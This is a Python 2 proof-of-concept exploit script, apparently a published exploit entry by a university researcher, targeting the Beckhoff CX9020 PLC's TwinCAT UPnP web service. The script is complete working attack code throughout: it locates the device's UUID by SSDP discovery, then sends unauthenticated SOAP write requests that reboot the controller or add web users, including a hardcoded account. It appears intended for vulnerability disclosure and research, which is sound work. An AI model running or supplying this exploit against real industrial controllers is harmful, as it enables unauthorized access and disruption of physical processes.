#! /usr/bin/env python
'''
    # Exploit Title: Beckhoff CX9020 CPU Module Web Exploit (RCE)
    # Date: 2015-10-22
    # Exploit Author: Photubias - tijl[dot]deneut[at]howest[dot]be, based on work by Frank Lycops (frank.lycops@thesecurityfactory.be)
    # Vendor Homepage: https://www.beckhoff.com/english.asp?embedded_pc/cx9020.htm
    # Version: TwinCat UpnpWebsite < 3.1.4018.13, fixed with ftp://ftp.beckhoff.com/software/embPC-Control/CX90xx/CX9020/CE/TC3/CX9020_CB3011_WEC7_HPS_v602i_TC31_B4018.13.zip
    # Tested on: Python runs on any Windows or Linux
    # CVE : CVE-2015-4051 (similar to this CVE, but different service IPC Diagnostics Authentication <> Web Authentication)

    Copyright 2015 Photubias(c)

    Written for Howest(c) University College, Ghent University, XiaK

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

File name CX9020-WebControl.py
written by tijl[dot]deneut[at]howest[dot]be
This POC allows to reboot any CX9020 PLC and add random (Web) users to be configured.
 -> Test by going to http://<IP>/config (redirects to http://<NAME>:5120/UpnpWebsite/index.htm)
 -> Default credentials are guest/1 and webguest/1, but this exploit works without credentials
 -> Verify Website version by logging into http://<IP>/config and clicking "TwinCAT"
'''
import sys, httplib, socket, re, base64

## Defining Functions first:
def rebootMachine(UNS, IP, IO):
        ## This is the SOAP Message:
        SoapMessage = "<?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
        SoapMessage += "<s:Body><u:Write xmlns:u=\"urn:beckhoff.com:service:cxconfig:1\"><netId></netId><nPort>0</nPort><indexGroup>0</indexGroup>"
        SoapMessage += "<IndexOffset>-" + IO + "</IndexOffset>"
        SoapMessage += "<pData>AQAAAAAA</pData></u:Write></s:Body></s:Envelope>"

        ## Construct and send the HTTP POST header
        rebootwebservice = httplib.HTTP(IP + ":5120")
        rebootwebservice.putrequest("POST", "/upnpisapi?uuid:" + UNS + "+urn:beckhoff.com:serviceId:cxconfig")
        rebootwebservice.putheader("Host", IP + ":5120")
        rebootwebservice.putheader("User-Agent", "Tijls Python Script")
        rebootwebservice.putheader("Content-type", "text/xml; charset=utf-8")
        rebootwebservice.putheader("Content-length", "%d" % len(SoapMessage))
        rebootwebservice.putheader("SOAPAction", "urn:beckhoff.com:service:cxconfig:1#Write")
        rebootwebservice.endheaders()
        rebootwebservice.send(SoapMessage)

        ## Get the response
        statuscode, statusmessage, header = rebootwebservice.getreply()
        if statuscode == 200:
                print "Exploit worked, device should be rebooting!"
                return 1
        else:
                print "Something went wrong, the used index is probably wrong? This is the response code:"
                ## Printing HTTP Response code
                res = rebootwebservice.getfile().read()
                print res
                return 0

        #print "Response: ", statuscode, statusmessage
        #print "headers: ", header

def addUser(UNS, IP, PDATA, IO):
        ## This is the SOAP Message:
        SoapMessage = '<?xml version="1.0" encoding="utf-8"?><s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
        SoapMessage += '<s:Body><u:Write xmlns:u="urn:beckhoff.com:service:cxconfig:1"><netId></netId><nPort>0</nPort><indexGroup>0</indexGroup>'
        SoapMessage += '<IndexOffset>-' + IO + '</IndexOffset>'
        SoapMessage += '<pData>' + PDATA + '</pData></u:Write></s:Body></s:Envelope>'

        ## Construct and send the HTTP POST header
        rebootwebservice = httplib.HTTP(IP + ":5120")
        rebootwebservice.putrequest("POST", "/upnpisapi?uuid:" + UNS + "+urn:beckhoff.com:serviceId:cxconfig")
        rebootwebservice.putheader("Host", IP + ":5120")
        rebootwebservice.putheader("User-Agent", "Tijls Python Script")
        rebootwebservice.putheader("Content-type", "text/xml; charset=utf-8")
        rebootwebservice.putheader("Content-length", "%d" % len(SoapMessage))
        rebootwebservice.putheader("SOAPAction", "urn:beckhoff.com:service:cxconfig:1#Write")
        rebootwebservice.endheaders()
        rebootwebservice.send(SoapMessage)

        ## Get the response
        statuscode, statusmessage, header = rebootwebservice.getreply()
        if statuscode == 200:
                print "Exploit worked, user is added!"
                return 1
        else:
                print "Something went wrong, the used index is probably wrong? This is the response code:"
                ## Printing HTTP Response code
                res = rebootwebservice.getfile().read()
                print res
                return 0

        #print "Response: ", statuscode, statusmessage
        #print "headers: ", header

def addOwnUser(UNS, IP, IO):
        ## This will prompt for username and password and then create the custom pData string
        USERNAME = raw_input("Please enter the username: ")
        PASSWORD = raw_input("Please enter the password: ")
        CONCATENATED = USERNAME + PASSWORD        
        
        # Creating the Full String to encode
        FULLSTRING = chr(16+len(CONCATENATED))
        FULLSTRING += chr(0)+chr(0)+chr(0)
        FULLSTRING += chr(len(USERNAME))
        FULLSTRING += chr(0)+chr(0)+chr(0)+chr(0)+chr(0)+chr(0)+chr(0)
        FULLSTRING += chr(len(PASSWORD))
        FULLSTRING += chr(0)+chr(0)+chr(0)
        FULLSTRING += CONCATENATED

        # Encode a first time, but we don't want any '=' signs in the encoded version
        PDATA = base64.b64encode(FULLSTRING)
        if PDATA.endswith('='):
                FULLSTRING += chr(0)
                PDATA = base64.b64encode(FULLSTRING)
        if PDATA.endswith('='):
                FULLSTRING += chr(0)
                PDATA = base64.b64encode(FULLSTRING)

        # Now we have the correct PDATA string
        print 'We will use this string: '+PDATA
        return addUser(UNS, IP, PDATA, IO)

def is_ipv4(ip):
	match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
	if not match:
		return False
	quad = []
	for number in match.groups():
		quad.append(int(number))
	if quad[0] < 1:
		return False
	for number in quad:
		if number > 255 or number < 0:
			return False
	return True

###### START PROGRAM #######
if not len(sys.argv) == 2:
        IP = raw_input("Please enter the IPv4 address of the Beckhoff PLC: ")
else:
        IP = sys.argv[1]
        
if not is_ipv4(IP):
	print "Please go read RFC 791 and then use a legitimate IPv4 address."
	sys.exit()

## Initialize variables
UNS = ''
ActiveRebootIndOff = '1329528576' # Active means active Engineering Licenses (when PLC has been programmed less than a week ago)
InactiveRebootIndOff = '1330577152'
ActiveUserIndOff = '1339031296'
InactiveUserIndOff = '1340079872'

print 'Finding the unique UNS (UUID) of the target system (' + IP + '), hold on...\n'

DISCOVERY_MSG = ('M-SEARCH * HTTP/1.1\r\n' +
                 'HOST: 239.255.255.250:1900\r\n' +
                 'MAN: "ssdp:discover"\r\n' +
                 'MX: 3\r\n' +
                 'ST: upnp:rootdevice\r\n' +
                 '\r\n')

SOCK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
SOCK.settimeout(10)
SOCK.sendto(DISCOVERY_MSG, (IP, 1900))
try:
        RESPONSE = SOCK.recv(1000).split('\r\n')
except:
        print 'Something went wrong, is the system online?\nTry opening http://' + IP + ':5120/config\n'
        raw_input('Press Enter to continue...')
        sys.exit(0)

for LINE in RESPONSE:
        if ':uuid' in LINE:
                UNS = LINE[9:45]
                print 'Got it: ' + LINE[9:45] + '\n'
SOCK.close()

if not UNS:
        print '\n\nProblem finding UNS, this is full SSDP response: \n'
        for LINE in RESPONSE: print LINE
        input('Press Enter to continue...')
        sys.exit(0)
else:
        print 'Let\'s go, choose your option:'
        print '1 = reboot PLC'
        print '2 = add user tijl with password xiak'
        print '3 = add user from your choosing'
        usr_input = raw_input('Select a number: ')
        if usr_input == '1':
                if not rebootMachine(UNS, IP, InactiveRebootIndOff):
                        rebootMachine(UNS, IP, ActiveRebootIndOff)
                raw_input('Press Enter to continue...')
        elif usr_input == '2':
                if not addUser(UNS, IP, 'GAAAAAQAAAAAAAAABAAAAHRpamx4aWFr', InactiveUserIndOff):
                        addUser(UNS, IP, 'GAAAAAQAAAAAAAAABAAAAHRpamx4aWFr', ActiveUserIndOff)
                raw_input('Press Enter to continue...')
        elif usr_input == '3':
                if not addOwnUser(UNS, IP, InactiveUserIndOff):
                        addOwnUser(UNS, IP, ActiveUserIndOff)
                raw_input('Press Enter to continue...')
        else:
                print 'Please choose a sensible input next time, exiting.'
                input('Press Enter to continue...')
                sys.exit()